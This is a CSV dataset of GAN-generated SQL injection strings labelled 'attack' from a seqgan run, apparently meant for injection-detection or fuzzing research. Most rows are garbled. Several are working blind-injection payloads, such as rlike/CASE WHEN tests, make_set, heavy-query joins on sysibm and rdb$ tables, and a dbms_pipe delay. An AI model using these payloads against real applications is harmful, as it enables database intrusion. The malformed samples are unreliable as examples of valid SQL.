label,payload,family,payload_type,method,run_id,sample_index
attack,"1%vand   ""%""  ( qdpgt  66  =  92633  =  ""    3,null'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,275
attack,"-""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  """"  =  ""Ape_and_ner_uiounppuceec  z  66p_ue  =  ,h  = 4297)   9607  =    ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,276
attack,1  %'  =  '=   7185j(  )  79||cpnndfrom  =  r,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,277
attack,"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,278
attack,selectc comepj5333  =  '  )   or 8384  =  like  (  '   '  )    (     )  5  select and  char  5  x  =  2223select    )   andhr  =  5000000   edypiflumsiudbfugy_pcsailvnast      couhr  ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,279
attack,",""ampuscouluseumm",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,280
attack,1`,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,281
attack,1=  select or,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,282
attack,,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,283
attack,15000000fnum,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,284
attack,-%'  =  'sv   like  hggcuneu=  (  =    like and   h)ablvg  )    116,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,285
attack,"1'ollceq_ung_uluz  )   or 8407   1vue  =q6414 whereas t2,r  =1abulumu_nrek$+r_(  ||chr  (  --  )   pp",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,286
attack,1%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,287
attack,1'kfgeppumeseaie.xzz3455  m,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,288
attack,1    load_file,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,289
attack,",g or gc5556  =    ""    *   5",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,290
attack,"-%from""   )    )     )   or 6872  =  6872 and    (    (     (  "" c    ncomesicome_mspp_ukcont  )  7471  select  101  )e,rqm or",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,291
attack,"1""   )    )     )   and make_set  (  6751  =  8128,8128  )   and    (    (     (  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,292
attack,1aoperehs  else  11dbuqs_.,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,293
attack,"15(  ,  69*abmasaiptbfnlmeceimves  hr  ,103  ()  )   ""ymss""",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,294
attack,select  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,295
attack,"1%_103""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,296
attack,"select or cmr.t  ""  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""  ,and  )   from and aiu_usvuscrcchr  =ybmhr  ||chrhasbusasei9432  ag",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,297
attack,"12912nuuse""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,298
attack,"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,299
attack,"1%""   )    )    and   (  1248  =  8705  )  *8705 and    (    (   ""h     _pcivgfpz   kwhere(  (  ,%""  ' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,300
attack,"- whenj   qa_bclehsblueruandagysips vavdbupe""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,301
attack,"-17427%'  *  69=   9432  (  )  ,",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,302
attack,1null  =  5    iwherer,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,303
attack,"1.,3455ltc  =,s 7552  )   j   9432,aller  *  =  3056and   =o",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,304
attack,"19354  f""  )    select or  =  ||  select,al5000000em 9432    ||ch||67  )   from t  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,305
attack,"1'  )   and 3202  =  like  (  '  ,5  5000000m  r   d",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,306
attack,-couu,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,307
attack,"1%""   )    )    or   (  6485  =  1127  )  *1127 and    (    (   ""%%7185",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,308
attack,1,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,309
attack,"15000000  )   where k3902a  x  (  ""vfvh""  =  46  1rp%""  =  ""%",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,310
attack,"1%puq%$pbcleh)  * or  69  selectch  )*db$tppppe(   '  =  'uuumupcerrsez  )   from 1  )   where ""  =  ""lluses",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,311
attack,"1""   )    )    and   (  1248  =  8705  )  *8705 and    (    (   ""7272      =  '  =  '""  =  ""  null  )    =  )m rrK",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,312
attack,"1%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,313
attack,"1a     ""  =  ""2x  ||  (  = 7417  (  selecty",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,314
attack,"1""  =  ""7552 8312  )   or cou_oumpper  (  =gz)   wherea   mes and  =    --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,315
attack,1,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,316
attack,1,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,317
attack,"16846""   )    )     =     (    (   ""sas bab_pe",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,318
attack,-u-86735158kq6414b,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,319
attack,1qvkmei. 90  ||t  )   fromerakb_pvlent  (  =  4728  =  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,320
attack,"1""chr",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,321
attack,1'+  (  select '  )from,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,322
attack,%  ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,323
attack,13902,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,324
attack,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'qu_unt  )""  5888  )   3,rdb$m dob"" like ""nrr",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,325
attack,14728  ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,326
attack,1'  =  '71825000000z  *5127char  )  8459  =i'ootz',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,327
attack,"""ys asgf  (  (    79  '  =  'h  )  ('  =  '  9687  )   ' oransasicop_,saxs  (  8220  1   and  auc  vggmuncouu  uuuiu_p.s  116  116,w3175 rr  ||  (51272072  r  (  =%select)   from,dolses dbv_pt  =         f'  =  '""  =  ""dom",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,328
attack,"1500000000t  (  )   (  ||   wherepppuzchr  , and(  ""   )    )    and   (  1248  =  8705  )  *8705 and    (    (   "",r",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,329
attack,(  90  %'  =  ''  =  '  select  || int  ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,330
attack,-jm  ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,331
attack,",5000000""gzhp""   fromrdole as f  *blomiumencerii",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,332
attack,1)   bf,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,333
attack,1from or and coume=ea  =      *  ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,334
attack,"1'  )   or 8384  =  like  (  'zechar  =   ||cuupeqfehr  =  5888  1      *  )   andjaubu_zu_mses r  =    ,9432  ,rsaorblzpe""  =  ""kfuvu(chd",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,335
attack,166-  69cuci,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,336
attack,1%%'qipt'(,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,337
attack,1%%,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,338
attack,1'+  (  select 't  'abcdefg'llt  =  )   ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,339
attack,1dom ar,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,340
attack,1--,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,341
attack,"1%5   char  )  (  3645112,'hrbmc(  =   ||_seq_siuncv""   )    )    or    (    (   """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,342
attack,"1iule_pcu_seree_n'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'x",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,343
attack,"14212  *   db_mes'l_unt  )  69,",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,344
attack,"1'+  (  select 'ce=  68  1  )   (pnwhere alk""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""_ul_m.e  ecase_ure_schales  select 5556  (  =  *  '  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,345
attack,1Qif,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,346
attack,1,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,347
attack,1%'  =  '%selectx,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,348
attack,17046 rdpbusec.3902com,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,349
attack,"""  select ra""   )    )     =     (    (   ""_ulue2367qe  xinfm",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,350
attack,25831ygo  4  =    )  ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,351
attack,,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,352
attack,15098,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,353
attack,"1""ymss"",sap",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,354
attack,"1%1],'+  (  select 'v(  878189  =  *5bmysablt  =  87   )   t  select t  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,355
attack,"1j""  =   fromall_llc  (  101  --  *"" like ""t109  select  101  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,356
attack,"""%""""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  """"  =  ""5",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,357
attack,"1%r_ppk  '  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,358
attack,-%*'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,359
attack,1,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,360
attack,"1"" or make_set  (  9354  =  9354,7185  )   and ""m",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,361
attack,"1VB""  (  %  0y",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,362
attack,1   1041,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,363
attack,"1'5888  (  (    , bpznaiuuuest",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,364
attack,1'+  (  select 'gmeer  =   1dommg   2072ouvmpanequeus where  as dbmbmesecym,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,365
attack,"1%'qqpjq'[l  char  =    orr  =  (  ,'abcdefg'>aiuuuns  =r  )  *,'  =  ',do",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,366
attack,s g8514re  =    (  =  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,367
attack,"-dbmas orr  "" or make_set  (  9354  =  9354,7185  )   and ""_mendbz  90  =  4641 as   vq+  chasbunauiedunge8189bpc$fpnc%(' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'endt  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,368
attack,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,369
attack,1103  =  selecter  azk    ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,370
attack,1%ur   p9687--vpuuz   vuugeis  ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,371
attack,"1'5903'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'bms coe  r  '  and #sakeippuf  ieie79pvbmlib.",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,372
attack,",r4889%   gf  char  =  ,yeu_mnc_upepel_unkapm(  selectcouyunu",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,373
attack,-%1422%),boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,374
attack,1'  =  'de_gu    =||euse    =  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,375
attack,1,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,376
attack,"-selectchr  1041  =  1,rawvcp",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,377
attack,"17272   ' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,378
attack,"1  ""  v)  ),w%'h2  ""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""  )   2072)  ,(    ||  (  =  ||a",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,379
attack,"1%""  )   or make_set  (  9539  =  9519,9519  )   and   (  """"*     5vfromeribchr  *  )    where)   where r  5ppmas",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,380
attack,"1""5  (  )    *  (   9643  apum$cpempf",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,381
attack,1   or er  66,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,382
attack,-%%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,383
attack,"1""4297  =3595  ,2367s db$fpn",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,384
attack,"1z""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""char  ||qmakt    101  || cth  =    =      3595  a    selecter    =  90    (  (  select)   and t  87 where 8312    'qomf' 3175  (  1   ' where 3036  =  3036 and elt  (  1832  =  6644,6644   )    )   ||'",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,385
attack,"12912=    qr=  'osqf'select and    j   and       xuuu_pekez9688zkfog' where 3036  =  3036 and elt  (  1832  =  6644,6644   )    )   ||'ugojchar where x  (  select apshr  =    ""   opppppomeks  ||chr  =  1--qRkf",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,386
attack,"select   4062  ""gzhp""      1,where,rdbencmrppieceeou_penu7471  3056rur  (  5127ch(  j",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,387
attack,"1%bunpvunalekt    )   5098  112  )   [  ||mnnullas or c*""  =  ""uz",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,388
attack,1,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,389
attack,1s  )   and c  =asipm gec  r f,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,390
attack,"-'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'r  68  '+  (  select '  =  selectr  4123  =  (  (",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,391
attack,)   3202load_file(  )   et  5333  =  3645  -   :'  =  'llllecim,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,392
attack,"""( and65||em  (  7272  =  3645  select1s   ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,393
attack,"1%r%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,394
attack,1},boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,395
attack,1'vxeor,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,396
attack,"1or( orge""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""onhr  =     --  ""  || wherede  =    )     9432  )   from",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,397
attack,"-where""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""uasekm  3  =    selecte)  )   orr  x,""  =  ""kpupgeh apuuu  79couvuu  _merez  )  app0  =,rble_e",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,398
attack,-%%-,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,399
attack,"1%    "")   from r'  )   and    (    (   '  83  )"" like ""%mh  )   --"" or make_set  (  9354  =  9354,7185  )   and """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,400
attack,"  %  ,r",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,401
attack,1  =    ||  ) t  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,402
attack,-%5158_'qomf'suuklupeme_seg,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,403
attack,"1'_ndatabase  79  )  case'  =  '(   3455  ,  ,do   maluumesmes  -- load_filer1fp"" like ""gkz4123",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,404
attack,12367,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,405
attack,"1""  =  ""%2925%qwhere%  =  3707  68  =  )   wherewhen--",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,406
attack,-%*117mwk66  '  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,407
attack,-select)   from,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,408
attack,"--^1%%70467007     103  ""  )  9607  ,'+  (  select 'e",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,409
attack,"-'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  'z112cqosl_llei",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,410
attack,1,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,411
attack,"-9casem  whenppu_urhr  ,65j)   1",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,412
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ''  )   or 8384  =  like  (  '  r  3018  )aesd   dand    8459qe8459(=  3*  select g  --m",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,413
